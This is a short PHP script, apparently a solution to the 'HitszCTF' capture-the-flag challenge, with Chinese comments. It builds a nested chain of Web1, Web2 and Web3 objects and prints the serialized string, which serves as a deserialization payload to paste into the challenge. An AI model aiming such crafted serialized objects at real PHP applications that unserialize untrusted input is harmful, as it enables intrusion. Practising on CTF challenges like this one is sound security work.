<?php
class Web1 {
    public $name;
}
class Web2 {
    public $name;
}
class Web3 {
    public $name;
    public $res;
}

// 构造嵌套对象链
$n = new Web1();
$n -> name = new Web2();
$n -> name -> name = new Web3();
$n -> name -> name -> name = new Web3();
$n -> name -> name -> name -> res = 'HitszCTF';

// 生成序列化字符串（直接复制这个输出！）
echo serialize($n);
?>